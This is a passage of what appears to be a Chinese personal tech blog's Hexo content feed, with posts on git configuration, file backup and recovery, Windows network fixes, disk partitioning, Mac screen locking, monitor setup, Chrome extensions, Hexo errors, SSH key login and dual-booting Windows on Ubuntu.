clone裸仓库（克隆自动关联），然后在裸仓库中添加代码推送即可"></a>方法二：git clone裸仓库（克隆自动关联），然后在裸仓库中添加代码推送即可</h3><hr><h1 id="六、git的配置"><a href="#六、git的配置" class="headerlink" title="六、git的配置"></a>六、git的配置</h1><p>设置用户名与邮件地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;John Doe&quot;</span><br><span class="line">$ git config --global user.email johndoe@example.com</span><br></pre></td></tr></table></figure><p>查看配置信息<br><code>git config --list</code><br>git别名设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global alias.co checkout</span><br><span class="line">$ git config --global alias.br branch</span><br><span class="line">$ git config --global alias.ci commit</span><br><span class="line">$ git config --global alias.st status</span><br><span class="line">$ git config --global alias.unstage &apos;reset HEAD --&apos;</span><br><span class="line">$ git config --global alias.last &apos;log -1 HEAD&apos;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件编程 </category>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> 备份 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件的恢复</title>
      <link href="/post/recovery-of-the-file/"/>
      <url>/post/recovery-of-the-file/</url>
      
        <content type="html"><![CDATA[<p>相信大家都会有丢失文件的经历，接下来，我们就来谈谈在哪里能够买到”后悔药”。</p><a id="more"></a><h3 id="方法一-使用具有定时备份功能的移动硬盘"><a href="#方法一-使用具有定时备份功能的移动硬盘" class="headerlink" title="方法一 使用具有定时备份功能的移动硬盘"></a>方法一 使用具有定时备份功能的移动硬盘</h3><p>比如我的WD My Passport Ultra就有定时备份的功能，而且可以对硬盘进行加密，从而保证数据的安全</p><h3 id="方法二-使用Windows的备份功能"><a href="#方法二-使用Windows的备份功能" class="headerlink" title="方法二 使用Windows的备份功能"></a>方法二 使用Windows的备份功能</h3><p>在控制面板中进行设置备份功能，好想很少人使用啊</p><h3 id="方法三-在Mac下使用Time-Machine"><a href="#方法三-在Mac下使用Time-Machine" class="headerlink" title="方法三 在Mac下使用Time Machine"></a>方法三 在Mac下使用Time Machine</h3><p>Mac下的Time Machine是一款非常好用的备份工具，不过我们需要设置好备份哪些文件，这样才能在后悔的时候挽救我们</p><h3 id="方法四-使用Mac自带的文本编辑工具"><a href="#方法四-使用Mac自带的文本编辑工具" class="headerlink" title="方法四 使用Mac自带的文本编辑工具"></a>方法四 使用Mac自带的文本编辑工具</h3><p>这个工具我个人觉得不是很好用，但它隐藏了一个十分实用的功能——恢复被修改的文件。<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91.jpg" alt="恢复文件"></p><p><img src="http://ohx73ws1b.bkt.clouddn.com/%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95.png" alt="文稿历史记录"></p><h3 id="方法五-使用git"><a href="#方法五-使用git" class="headerlink" title="方法五 使用git"></a>方法五 使用git</h3><p>git作为如今最为流行的版本管理工具，这应该是这个世界上最好的备份管理工具了，当你丢过一次代码或把代码搞的很乱的时候就知道它有多么重要了。不过这个工具对于普通用户有一定的学习成本，但如果一个程序员说你不会git那就要面壁了。</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 备份 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows常见网络故障及解决办法</title>
      <link href="/post/network-diagnose/"/>
      <url>/post/network-diagnose/</url>
      
        <content type="html"><![CDATA[<p>日常生活中，我们总是会在Windows中遇到莫名其妙其妙的网络问题，今天，博主就自己遇到的网络问题及解决办法与各位分享一下。</p><a id="more"></a><p>如果电脑不能正常上网，请按照以下步骤进行尝试修复：</p><ol><li><p>网络图标有黄色感叹号</p><p>解决办法：命令行(Windows+R)运行命令“netsh winsock reset ”后重启即可。</p></li><li><p>笔记本的WiFi物理开关是否打开</p><p>解决办法：找到WiFi开关并打开</p></li><li><p>动态IP或静态IP是否设置正确<br><img src="http://ohx73ws1b.bkt.clouddn.com/DHCP%E8%AE%BE%E7%BD%AE.png" alt=""></p><p> 解决办法：根据自己的网络情况正确设置图示页面，通常家用路由器环境保持图示设置即可。</p></li><li><p>WLAN服务是否启用<br> <img src="http://ohx73ws1b.bkt.clouddn.com/%E5%90%AF%E5%8A%A8WLAN%E6%9C%8D%E5%8A%A1.png" alt=""></p><p> 解决办法：打开计算机管理，查看WLAN服务状态，未启用则设置为“自动”</p></li><li><p>网络设备驱动器有黄色感叹号</p><p>解决办法：使用“驱动精灵”或“驱动人生”等工具尝试修复驱动</p></li><li><p>是否启用了一个无效的代理</p><p>解决办法：重新更换有效代理或不使用代理</p></li><li><p>能正常使用QQ，但无法打开网页</p><p>解决办法：请尝试设置图一中的DNS为114.114.114.114和114.114.115.115后重新尝试</p></li></ol><hr><p>另附一些诊断网络状态的命令</p><ol><li>ping 127.0.0.1       检查tcp/ip协议是否正常</li><li>ping 本机ip    检查网卡</li><li>ping 网关地址     检查和网关的连接性</li><li>nslookup命令可用于查看DNS是否正常</li><li>ping远程网站查看网络连通性</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>移动硬盘的分区</title>
      <link href="/post/partition/"/>
      <url>/post/partition/</url>
      
        <content type="html"><![CDATA[<p>我们刚拿到一个移动硬盘的时候，通常都是将其根据我们的需要划分为多个分区，那首先要了解一下各种格式的优缺点及适用场景：</p><a id="more"></a><h4 id="各种格式对比"><a href="#各种格式对比" class="headerlink" title="各种格式对比"></a>各种格式对比</h4><table><thead><tr><th align="center">格式</th><th align="center">优点</th><th align="center">缺点</th></tr></thead><tbody><tr><td align="center">FAT32</td><td align="center">全平台支持</td><td align="center">不支持单个文件大于4G的移动</td></tr><tr><td align="center">NTFS</td><td align="center">Windows平台下最佳</td><td align="center">Mac平台下可读不可写（可购买Paragon NTFS for Mac写入数据）</td></tr><tr><td align="center">exFAT</td><td align="center">全平台支持，适合小文件的存储，U盘常用格式</td><td align="center">据查在某些情况下容易丢失数据</td></tr><tr><td align="center">HFS+（日志式）</td><td align="center">Mac下最佳，TimeMachine要求的格式</td><td align="center">Windows下不可读不可写</td></tr><tr><td align="center">ext4</td><td align="center">Linux下最佳，可读写NTFS和HFS+</td><td align="center">暂未发现</td></tr><tr><td align="center">表格数据来源：<a href="https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%AF%B9%E6%AF%94" target="_blank" rel="noopener">文件系统对比</a></td><td align="center"></td><td align="center"></td></tr></tbody></table><h4 id="实际分区举例"><a href="#实际分区举例" class="headerlink" title="实际分区举例"></a>实际分区举例</h4><p>以博主的情况为例，手上有一个WD My Passport Ultra的1T移动硬盘，通常在Mac下使用，而且要用此盘作Time Machine，其次就是Windows平台的使用，因此需要划分3个分区。Mac分区和Time Machine自然是日志式，Windows平台格式如果是FAT32自然是很方便，但经常会移动4G以上的文件，exFAT又可能会丢失数据，因此决定使用NTFS格式。</p><p>接下来，在Windows平台下使用磁盘精灵（DiskGenius）将硬盘分为1个600G的FAT32格式和1个400G的NTFS格式，然后在Mac自带的磁盘工具下将FAT32格式的600G再划分为400G和200G的日志式，这样就能够满足我的日常生活需要了，而且稳定性和兼容性都很不错。<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E7%A1%AC%E7%9B%98%E5%88%86%E5%8C%BA.jpg" alt="硬盘分区"></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分区 </tag>
            
            <tag> 磁盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac设置快速休眠和锁屏</title>
      <link href="/post/mac-sleep-and-lock-screen/"/>
      <url>/post/mac-sleep-and-lock-screen/</url>
      
        <content type="html"><![CDATA[<p>众所周知，在Windows操作系统下，我们可以通过<code>Windows+L</code>键来锁定屏幕，转到Mac平台下一段时间后，我发现Mac似乎并没有这样的按键，一番搜索后，发现了以下几种方法来实现快速锁屏或休眠。</p><a id="more"></a><h3 id="方式一-合盖"><a href="#方式一-合盖" class="headerlink" title="方式一 合盖"></a>方式一 合盖</h3><p>众所周知，Mac系统非常的稳定，我们甚至可以半年不关机，即合即走，即开即用，非常方便。因此，我们可以通过盒盖的方式来使系统进入休眠的状态，但这种方式不够安全，如果你刚刚盒盖起身离去，另一个人马上就过来打开你的电脑，他仍然可以不需要输入密码而直接进入系统。在休眠状态下，系统会断开网络，保存正在运行的程序状态，直至系统被唤醒。</p><h3 id="方式二-触发角"><a href="#方式二-触发角" class="headerlink" title="方式二 触发角"></a>方式二 触发角</h3><p>打开”系统偏好设置”，然后点击屏幕保护程序下的触发角</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/%E8%AE%BE%E7%BD%AE%E8%A7%A6%E5%8F%91%E8%A7%92.jpg" alt="触发角设置"></p><p>这样，当鼠标移动到显示器的右下角时，系统就会进入休眠状态。如果你有外接显示器，无论你在哪个显示器下进行此操作都是可以生效的。</p><p>这种方式下，实质与方式一相同，只不过不需要合盖而已，因此同样不够安全。</p><h3 id="方式三-Alfred锁定计算机"><a href="#方式三-Alfred锁定计算机" class="headerlink" title="方式三 Alfred锁定计算机"></a>方式三 Alfred锁定计算机</h3><p>由于方式一、二对于有重要数据的人来说仍然不够安全，因此我们需要一种能够像Windows+L那样的快速锁屏方式来保证数据安全。<br>首先来简单介绍以下Alfred，这是一个提升Mac效率的神器，可以看作是系统自带的Spotlight的增强版，我们绝大多数的操作都可以在呼出Alfred后马上执行，如查单词（付费版）、算术、打开软件、使用搜索引擎搜索（自定义搜索引擎需付费）等。</p><p>当然了，Alfred也具备了Spotlight所没有的锁屏功能，我们直接呼出Alfred后输入”lock”回车即可锁定屏幕，从而保证我们的数据安全。而且这一功能在免费版本中即可使用。</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/Alfred%E9%94%81%E5%B1%8F.jpg" alt="Alfred"></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 锁屏 </tag>
            
            <tag> 安全 </tag>
            
            <tag> 休眠 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外接显示器的设置</title>
      <link href="/post/external-display-tutorial/"/>
      <url>/post/external-display-tutorial/</url>
      
        <content type="html"><![CDATA[<p>小屏幕的MacBook/MacBook Pro放在桌上长时间使用，眼睛比较累，而且，长时间低头看屏幕，易得颈椎病，绝对有损健康。配一台大屏幕的外置显示器不失为两全其美的好办法。</p><a id="more"></a><p>首先，得买一台中意的大屏幕LED显示器（废话undefined ）。一般22~27吋的、全高清的就比较好。如果你经济条件好，当然可以买尺寸更大的、分辨率更高的Apple大屏显示器。</p><p>其次，摆放好本本和外置显示器的位置，根据支持的接口情况，将大屏幕LED显示器与MacBook Air/MacBook Pro用ThunderBolt或HDMI线连接后，开机。</p><p>接着，进行一些必要的设置。以显示器设为“扩展”为例：</p><ol><li><p>打开“系统偏好设置-显示器”，出现两个显示器的设置窗口。可以将设置窗口拖到任一显示屏上。如果不能正确显示外置显示器信息，就点击“检测显示器”。</p></li><li><p>对每一块显示屏，设置相应的最合适的分辨率。<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8%E8%AE%BE%E7%BD%AE.jpg" alt="外接显示器的设置"></p></li><li><p>点击“排列”，将显示器图形拖到跟实际位置对应的左/右位置。这样，当你将外置显示器设置为默认的“扩展”桌面时，就不至于发生要将鼠标反向移动到另一块屏幕上的尴尬。<br><img src="http://ohx73ws1b.bkt.clouddn.com/%E5%A4%96%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8%E6%8E%92%E5%88%97.jpg" alt="外接显示器的排列设置"></p></li><li><p>如果你要将外置显示器作为主屏幕，还必须进行以下设置：<br>（1）将设置图中小屏幕上面的白色菜单栏拖到大屏幕图标上方。两个屏幕都会闪一下，菜单栏就移到大屏幕上方，大屏就是主屏幕了。<br>（2）如果你原来已将Dock放在小屏幕的左/右侧，而现在Dock仍在小屏幕上，那么，还要将Dock移到大屏幕上。方法是：右键点击“Dock”的“斑马线”分隔符，选择“置于屏幕上的位置-左边/右边”，将Dock设置到大屏侧边。注意：如果你喜欢将Dock放在主屏幕的右边，那么，开始安排位置的时候，你的本本就应该放在外置显示器的左边，因为你的大屏是小屏幕的“扩展”；反之亦然。</p></li><li><p>如果需要的话，选中“在菜单中显示显示器图标”，在桌面顶部菜单中出现显示器图标，方便以后更改设置。</p></li><li><p>如果你要关闭本本的小屏幕、只用外置大屏幕，那么，只要合上本本的盖子，几秒后大屏幕自动黑屏后再变亮，你就可以用鼠标在大屏幕上操作了。如果你要输入文字，那么，还需要添加一个键盘（USB或蓝牙、无线的都可以）</p></li><li><p>如果你觉得在外接显示器后移动鼠标变得费力，那你可以试试在Chrome或Firefox下安装Vimium扩展，这样就可以无需鼠标畅游web了<br><img src="http://ohx73ws1b.bkt.clouddn.com/Vimium.jpg" alt="Vimium"></p></li></ol><p>Windows下的设置大同小异，在此不再赘述。</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Chrome插件推荐</title>
      <link href="/post/chrome-extension/"/>
      <url>/post/chrome-extension/</url>
      
        <content type="html"><![CDATA[<p>扩展推荐列表</p><h3 id="1-Adblock-Plus"><a href="#1-Adblock-Plus" class="headerlink" title="1. Adblock Plus"></a>1. <a href="https://chrome.google.com/webstore/detail/adblock-plus/cfhdojbkjhnklbpkdaibdccddilifddb" target="_blank" rel="noopener">Adblock Plus</a></h3><a id="more"></a><p>   推荐理由：强力去除各种广告，包括YouTube的视频广告，不过无法过滤视屏广告。有些网站会反屏蔽广告，否则不能浏览页面，这样的网站加白名单就好了。</p><h3 id="2-Infinity新标签页"><a href="#2-Infinity新标签页" class="headerlink" title="2. Infinity新标签页"></a>2. <a href="https://chrome.google.com/webstore/detail/infinity-new-tab/dbfmnekepjoapopniengjbcpnbljalfg" target="_blank" rel="noopener">Infinity新标签页</a></h3><p>   推荐理由：优雅的图标、漂亮的壁纸，每日自动切换，天天都有好心情</p><h3 id="3-Tampermonkey-Firefox中是GreaseMonkey附加组件"><a href="#3-Tampermonkey-Firefox中是GreaseMonkey附加组件" class="headerlink" title="3. Tampermonkey(Firefox中是GreaseMonkey附加组件)"></a>3. <a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">Tampermonkey</a>(Firefox中是GreaseMonkey附加组件)</h3><p>   推荐理由：脚本工具的管理工具，可以通过修改本地的js或css代码来自定义页面。<br>   以下推荐脚本列表：</p><ul><li><a href="https://greasyfork.org/zh-CN/scripts/17800-%E8%A7%A3%E5%86%B3%E7%99%BE%E5%BA%A6%E4%BA%91%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E9%99%90%E5%88%B6" target="_blank" rel="noopener">一行代码，解决百度云大文件下载限制</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/24192-kill-baidu-ad" target="_blank" rel="noopener">百度广告(首尾推广及右侧广告)清理</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/10582-%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E9%AB%98%E9%9F%B3%E8%B4%A8%E6%94%AF%E6%8C%81" target="_blank" rel="noopener">网易云音乐高音质支持</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/6489-zhihu-visitor" target="_blank" rel="noopener">知乎免登录</a></li></ul><h3 id="4-网盘助手"><a href="#4-网盘助手" class="headerlink" title="4. 网盘助手"></a>4. 网盘助手</h3><p>   推荐理由：本地安装Aria2后配合此扩展绕过百度云限速与客户端大小限制</p><h3 id="5-Proxy-SwitchyOmega"><a href="#5-Proxy-SwitchyOmega" class="headerlink" title="5. Proxy SwitchyOmega"></a>5. <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">Proxy SwitchyOmega</a></h3><p>   推荐理由：轻松快捷管理和切换代理，仍然记得当年GAE和这个配合翻GFW</p><h3 id="6-OneTab"><a href="#6-OneTab" class="headerlink" title="6. OneTab"></a>6. <a href="https://chrome.google.com/webstore/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall" target="_blank" rel="noopener">OneTab</a></h3><p>   由于Chrome特别消耗内存，对于那些我们暂时不看的页面，我们都可以收集到OneTab中，降低系统内存消耗</p><h3 id="7-JSON-Viewer"><a href="#7-JSON-Viewer" class="headerlink" title="7. JSON Viewer"></a>7. JSON Viewer</h3><p>   推荐理由：将json格式的数据格式化输出，方便阅读。由于之前的JSONView被提示有安全漏洞，就转为这个了。</p><h3 id="8-Vimium"><a href="#8-Vimium" class="headerlink" title="8. Vimium"></a>8. <a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb" target="_blank" rel="noopener">Vimium</a></h3><p>   推荐理由：忘掉鼠标吧，用Vim的快捷键来浏览网页，快速准确找到你想要的</p><h3 id="9-Xdebug-helper"><a href="#9-Xdebug-helper" class="headerlink" title="9. Xdebug helper"></a>9. <a href="https://chrome.google.com/webstore/detail/xdebug-helper/eadndfjplgieldjbigjakmdgkmoaaaoc" target="_blank" rel="noopener">Xdebug helper</a></h3><p>   推荐理由：配合IDE调试代码，程序员必备神器</p><h3 id="10-Postman"><a href="#10-Postman" class="headerlink" title="10. Postman"></a>10. <a href="https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop" target="_blank" rel="noopener">Postman</a></h3><p>推荐理由：Postman是调试web api的一款利器，它能够发送任何类型的HTTP requests (GET, HEAD, POST, PUT..)，附带任何数量的参数+ headers。</p><p>支持不同的认证机制（basic, digest, OAuth），接收到的响应语法高亮（HTML，JSON或XML）。</p><p>Postman 能够保留了历史的请求，这样我们就可以很容易地重新发送请求，有一个“集合”功能，用于存储所有请求相同的API/域。</p><h3 id="11-EditThisCookie"><a href="#11-EditThisCookie" class="headerlink" title="11. EditThisCookie"></a>11. <a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank" rel="noopener">EditThisCookie</a></h3><p>推荐理由：EditThisCookie是一个cookie管理器。您可以添加，删除，编辑，搜索，锁定和屏蔽cookies！</p><h3 id="12-FeHelper"><a href="#12-FeHelper" class="headerlink" title="12. FeHelper"></a>12. <a href="https://chrome.google.com/webstore/detail/web%E5%89%8D%E7%AB%AF%E5%8A%A9%E6%89%8Bfehelper/pkgccpejnmalmdinmhkkfafefagiiiad" target="_blank" rel="noopener">FeHelper</a></h3><p>推荐理由：提供了很多常用的FE工具，包括字符串编解码、图片base64编码、代码压缩、美化、JSON格式化、正则表达式、时间转换工具、二维码生成器、编码规范检测、页面性能检测、栅格检测、JS运行效率分析等。</p><p>非常实用，强烈推荐！</p><h3 id="13-划词翻译"><a href="#13-划词翻译" class="headerlink" title="13. 划词翻译"></a>13. <a href="https://chrome.google.com/webstore/detail/%E5%88%92%E8%AF%8D%E7%BF%BB%E8%AF%91/ikhdkkncnoglghljlkmcimlnlhkeamad" target="_blank" rel="noopener">划词翻译</a></h3><p>推荐理由：一个简便但强大的翻译扩展。支持谷歌、百度、有道、必应四大翻译和朗读引擎，可以方便的查看、复制和朗读不同引擎的翻译结果。</p><p>对阅读英文文档非常有帮助。</p><h3 id="14-豆藤"><a href="#14-豆藤" class="headerlink" title="14.豆藤"></a>14.<a href="http://www.douban.com/note/481190431/" target="_blank" rel="noopener">豆藤</a></h3><p>推荐理由：豆瓣是个好网站，找书找电影先去豆瓣逛逛～豆藤可以一键找出电影、书籍的下载地址，还提供了很多豆瓣的很多小功能。</p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chrome </tag>
            
            <tag> 浏览器 </tag>
            
            <tag> 插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo遇到的那些坑</title>
      <link href="/post/hexo-error/"/>
      <url>/post/hexo-error/</url>
      
        <content type="html"><![CDATA[<p>首先，贴上我搭建成功的教程地址 <a href="https://xuanwo.org/2015/03/26/hexo-intor/" target="_blank" rel="noopener">史上最详细的Hexo博客搭建图文教程</a></p><a id="more"></a><p>其次，这个博客里还有hexo中常见的问题 <a href="https://xuanwo.org/2014/08/14/hexo-usual-problem/" target="_blank" rel="noopener">Hexo常见问题解决方案</a></p><p>接下来，我们来谈谈我在搭建时遇到的一些坑：</p><h3 id="1-hexo的3行报错-DTrace-错误"><a href="#1-hexo的3行报错-DTrace-错误" class="headerlink" title="1. hexo的3行报错(DTrace 错误)"></a>1. hexo的3行报错(DTrace 错误)</h3>   <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/Release/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/default/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br><span class="line">&#123; [Error: Cannot <span class="built_in">find</span> <span class="keyword">module</span> <span class="string">'./build/Debug/DTraceProviderBindings'</span>] code: <span class="string">'MODULE_NOT_FOUND'</span> &#125;</span><br></pre></td></tr></table></figure><p>   出现这种情况是因为GFW导致npm下载过程中依赖库不完整</p><p>   解决办法：</p><p>   更换国内镜像<a href="http://www.jianshu.com/p/0deb70e6f395" target="_blank" rel="noopener">http://www.jianshu.com/p/0deb70e6f395</a><br>   然后 卸载并重新安装<br>   <figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm uninstall hexo-<span class="keyword">cli</span> -g</span><br><span class="line">$ npm install hexo-<span class="keyword">cli</span> -g</span><br></pre></td></tr></table></figure><br>   或者使用以下命令安装解决<br>   <figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">npm</span> install hexo --<span class="literal">no</span>-optional</span><br></pre></td></tr></table></figure><br>   反正我是用的更换源的办法解决的，这样解决的更彻底，速度提升了不只一个量级。</p><h3 id="2-博客在本地测试正常，部署到线上没有样式"><a href="#2-博客在本地测试正常，部署到线上没有样式" class="headerlink" title="2. 博客在本地测试正常，部署到线上没有样式"></a>2. 博客在本地测试正常，部署到线上没有样式</h3><p>   这个情况我们可以在控制台中看到，样式的相关文件加载报了404错误，就是因为路径的填写问题，注意hexo官网对于网址路径的解释<br>   <img src="http://ohx73ws1b.bkt.clouddn.com/%E5%8D%9A%E5%AE%A2%E7%9B%AE%E5%BD%95%E9%97%AE%E9%A2%98.jpg" alt="博客路径问题"></p><h3 id="3-hexo-g命令报错"><a href="#3-hexo-g命令报错" class="headerlink" title="3. hexo g命令报错"></a>3. <code>hexo g</code>命令报错</h3><p>   <img src="http://ohx73ws1b.bkt.clouddn.com/hexo%20g%E6%8A%A5%E9%94%99.jpg" alt="渲染报错"><br>   如果遇到hexo g报错的情况，这并不是由于文件的权限问题导致的，同样是由于yml严格的语法问题导致的，这个问题导致我用IDE打开博客时都会卡死<br>   <img src="http://ohx73ws1b.bkt.clouddn.com/hexo%20g.jpg" alt="渲染报错根源"></p><p>   因此，我们在编辑yml文件时要格外的小心，除了<code>:</code>后<strong>必须</strong>有空格外，其中的缩进也是有严格要求的，我们可以通过在线网站<a href="http://www.yamllint.com/" target="_blank" rel="noopener">YAML Lint</a>来帮助我们排错，以免因为yml的格式问题耗费太多的时间。</p><h3 id="4-Hexo常见问题解决方案"><a href="#4-Hexo常见问题解决方案" class="headerlink" title="4. Hexo常见问题解决方案"></a>4. Hexo常见问题解决方案</h3><p><a href="https://xuanwo.org/2014/08/14/hexo-usual-problem/" target="_blank" rel="noopener">https://xuanwo.org/2014/08/14/hexo-usual-problem/</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 坑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH密钥登录教程</title>
      <link href="/post/ssh-login-tutorial/"/>
      <url>/post/ssh-login-tutorial/</url>
      
        <content type="html"><![CDATA[<p>从此再也不怕忘记密码了;)</p><a id="more"></a><h3 id="Step-1：检查密钥"><a href="#Step-1：检查密钥" class="headerlink" title="Step 1：检查密钥"></a>Step 1：检查密钥</h3><p>查看本机~/.ssh/目录下是否有ssh公钥(id_rsa.pub)和私钥(id_rsa)，如果没有或者干脆连.ssh目录都不存在，那么请使用<code>ssh-keygen -t rsa -C &quot;email@example.com&quot;</code>来创建ssh密钥。</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/SSH%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90.jpg" alt="生成ssh密钥"></p><p>它先要求你确认保存公钥的位置（.ssh/id_rsa），然后它会让你重复一个密码两次，如果不想在使用公钥的时候输入密码，可以留空。</p><h3 id="Step-2：将公钥放置到远程服务器"><a href="#Step-2：将公钥放置到远程服务器" class="headerlink" title="Step 2：将公钥放置到远程服务器"></a>Step 2：将公钥放置到远程服务器</h3><p>将本机的<strong>公钥.ssh/id_rsa.pub</strong>放置在远程服务器对应用户名目录（如/root/.ssh）下的<code>/.ssh/authorized_keys</code>中，一行一个，并且将.ssh和authorized_keys权限设置为700和600。<br>一个便捷的命令：<code>ssh-copy-id -i ~/.ssh/id_rsa.pub  root@192.168.0.3  [-pport]</code></p><ul><li>该命令会自动将本地的ssh公钥复制到远程主机的authorized_keys文件中，同时会自动设置相关权限。</li><li>若不支持该命令请手动复制id_rsa.pub内容到远程主机的authorized_keys（不存在请创建），或者使用ftp或sftp拷贝后重命名。</li></ul><h3 id="Step-3-设置本地ssh"><a href="#Step-3-设置本地ssh" class="headerlink" title="Step 3:设置本地ssh"></a>Step 3:设置本地ssh</h3><p>设置~/.ssh目录下的config文件</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/SSH%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="配置ssh"></p><h3 id="Step-4-使用ssh密钥登录"><a href="#Step-4-使用ssh密钥登录" class="headerlink" title="Step 4:使用ssh密钥登录"></a>Step 4:使用ssh密钥登录</h3><p>使用ssh+别名登录</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/SSH%E7%9A%84%E7%99%BB%E5%BD%95.jpg" alt="使用ssh密钥登录"></p><p>PS:如果你配置ssh免密钥登录失败时，检查一下</p><ol><li>你的authorized_keys文件是否放置在对应用户的文件夹下</li><li>你的.ssh和authorized_keys的权限设置是否正确</li></ol><h3 id="附：ssh原理"><a href="#附：ssh原理" class="headerlink" title="附：ssh原理"></a>附：ssh原理</h3><p>ssh密钥登录的原理：当我们使用普通方式登录时，远程主机通过/etc/shadow验证用户名和密码。而当我们配置好了ssh密钥登录时，我们每次发送登录请求时都会携带本机的私钥前往远程主机，远程主机收到登录请求后，不再去/etc/shadow校验，而转去authorized_keys查看是否已经存在对应的公钥（因为ssh的密钥是成对生成的，所以fingerprint是一样的），校验成功则登录成功，否则拒绝登录请求。</p><p><img src="http://ohx73ws1b.bkt.clouddn.com/ssh%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 日常技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> linux </tag>
            
            <tag> 密钥 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下安装Windows系统教程</title>
      <link href="/post/install-windows-on-linux/"/>
      <url>/post/install-windows-on-linux/</url>
      
        <content type="html"><![CDATA[<p>今天，有一台已经安装了Ubuntu 16.04，未分区的系统需要安装Windows 7双系统。</p><a id="more"></a><p>那接下来的第一步自然就是分区了，在Windows中磁盘精灵分区用的溜，但Linux中怎么分区呢？查询后得知Linux中可以用Gparted视图工具来分区，所以，Ubuntu系统用apt-get install gparted，CentOS用yum install gparted安装。</p><p>你以为分区就这么顺利？too young too simple，进去后才发现正在运行的系统所在分区是不可以执行分区操作的，具体的表现就是/dev/sda*有把钥匙，并且磁盘容量的调整最大值和最小值都是磁盘总容量。好吧，再次Google，原来可以用Live USB（类似于Windows下的PE环境）来进行分区操作，接下来就开始用软碟通制作Ubuntu的启动盘，在漫长的等待后终于顺利分出一个空白分区，然后用gparted将未分配的分区格式化为NTFS格式（<font color=red>Windows系统分区必须此格式</font>）。</p><p>接下来用优启通安装Windows 7，在重启的过程中系统提示“windows boot manager has been blocked by the current security policy”，那就关了boot选项的secure boot吧，兴冲冲的进去后发现这个选项是！灰！的！我&amp;*#w&amp;@%……折腾半天才想起来，现在的系统环境是UEFI+GPT，而Windows 7及以下只支持BIOS+MBR，要强制安装Windows 